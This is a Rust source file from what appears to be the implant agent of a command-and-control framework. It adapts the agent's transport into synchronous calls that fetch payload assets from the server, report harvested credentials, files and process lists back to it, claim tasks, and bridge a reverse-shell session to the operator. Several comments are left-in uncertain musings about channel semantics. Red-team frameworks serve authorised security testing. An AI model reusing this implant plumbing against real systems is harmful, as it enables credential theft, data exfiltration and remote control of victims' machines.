use anyhow::{Context, Result};
use pb::c2::*;
use std::sync::Arc;
use std::sync::mpsc::{Receiver, Sender};
use transport::{SyncTransport, Transport};

use crate::agent::ImixAgent;

pub struct ImixSyncTransport<T: Transport> {
    pub agent: Arc<ImixAgent<T>>,
}

impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T> {
    fn fetch_asset(&self, req: FetchAssetRequest) -> Result<Vec<u8>> {
        let res = self.agent.block_on(async {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            // Transport::fetch_asset takes std::sync::mpsc::Sender, so we pass it directly.
            // Wait, is Transport::fetch_asset taking std::Sender?
            // The trait definition says: sender: Sender<FetchAssetResponse>
            // and imports: use std::sync::mpsc::{Receiver, Sender};
            // So it IS std::sync::mpsc::Sender.
            // My previous implementation was:
            // let (tx, rx) = std::sync::mpsc::channel();
            // t.fetch_asset(req, tx).await?;
            // This matches the trait signature.

            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;
            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        });
        res.map_err(anyhow::Error::msg)
    }

    fn report_credential(&self, req: ReportCredentialRequest) -> Result<ReportCredentialResponse> {
        let res = self.agent.block_on(async {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.report_credential(req).await.map_err(|e| e.to_string())
        });
        res.map_err(anyhow::Error::msg)
    }

    fn report_file(&self, req: ReportFileRequest) -> Result<ReportFileResponse> {
        let res = self.agent.block_on(async {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            // Transport::report_file takes Receiver<ReportFileRequest> which is std::sync::mpsc::Receiver.
            // So we can pass it directly?
            // But we need to supply the receiver.
            // The caller of SyncTransport::report_file passes req: ReportFileRequest (single item).
            // SyncTransport::report_file is synchronous and takes a single request.
            // Wait, SyncTransport definition in implants/lib/transport/src/sync.rs:
            // fn report_file(&self, req: ReportFileRequest) -> Result<ReportFileResponse>;
            //
            // Transport definition in implants/lib/transport/src/transport.rs:
            // async fn report_file(&mut self, request: Receiver<ReportFileRequest>) -> Result<ReportFileResponse>;

            // So we need to create a channel, send the single request, and pass the receiver.
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req).map_err(|e| e.to_string())?;
            drop(tx); // Close sender so receiver knows it's done? Or is it expecting stream?
            // Usually report_file consumes stream until end.

            t.report_file(rx).await.map_err(|e| e.to_string())
        });
        res.map_err(anyhow::Error::msg)
    }

    fn report_process_list(
        &self,
        req: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let res = self.agent.block_on(async {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.report_process_list(req).await.map_err(|e| e.to_string())
        });
        res.map_err(anyhow::Error::msg)
    }

    fn report_task_output(&self, req: ReportTaskOutputRequest) -> Result<ReportTaskOutputResponse> {
        let res = self.agent.block_on(async {
            // Buffer the output locally for bulk reporting during the flush window
            self.agent.buffer_task_output(req).map_err(|e| e.to_string())?;
            Ok(ReportTaskOutputResponse {})
        });
        res.map_err(anyhow::Error::msg)
    }

    fn reverse_shell(
        &self,
        rx: Receiver<ReverseShellRequest>,
        tx: Sender<ReverseShellResponse>,
    ) -> Result<()> {
        let res = self.agent.block_on(async move {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;

            // Create tokio channels for async transport because Transport::reverse_shell
            // signature is:
            // async fn reverse_shell(&mut self, rx: tokio::sync::mpsc::Receiver<...>, tx: tokio::sync::mpsc::Sender<...>)

            let (tokio_tx_req, tokio_rx_req) = tokio::sync::mpsc::channel(32);
            let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);

            // Spawn bridge: std::mpsc::Receiver -> tokio::mpsc::Sender
            let rx_bridge = tokio::task::spawn_blocking(move || {
                while let Ok(msg) = rx.recv() {
                    if tokio_tx_req.blocking_send(msg).is_err() {
                        break;
                    }
                }
            });

            // Spawn bridge: tokio::mpsc::Receiver -> std::mpsc::Sender
            let tx_bridge = tokio::spawn(async move {
                while let Some(msg) = tokio_rx_resp.recv().await {
                    if tx.send(msg).is_err() {
                        break;
                    }
                }
            });

            // Run the async reverse shell
            if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
                #[cfg(debug_assertions)]
                log::error!("Transport reverse_shell error: {_e}");
            }

            rx_bridge.abort();
            tx_bridge.abort();
            Ok(())
        });
        res.map_err(anyhow::Error::msg)
    }

    fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let res = self.agent.block_on(async {
            let mut t = self
                .agent
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.claim_tasks(req).await.map_err(|e| e.to_string())
        });
        res.map_err(anyhow::Error::msg)
    }
}
